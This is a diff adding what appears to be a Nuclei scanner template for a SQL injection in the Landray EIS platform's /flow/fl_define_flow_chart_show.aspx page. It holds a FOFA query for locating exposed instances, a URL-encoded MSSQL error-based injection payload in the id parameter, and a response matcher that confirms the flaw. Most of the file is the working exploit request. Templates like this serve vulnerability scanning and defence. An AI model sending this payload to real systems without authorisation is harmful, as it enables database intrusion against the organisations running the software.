@@ -1,0 +1,23 @@
+id: landray-eis-define-flow-chart-show-sqli
+ 
+info:
+  name: 蓝凌EIS智慧协同平台-SQL注入-fl_define_flow_chart_show
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: app="Landray-EIS智慧协同平台" || body="jquery.landray.common.js" || icon_hash="953405444"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /flow/fl_define_flow_chart_show.aspx?id=1%20AND%205367%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7
+ 
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"12321")
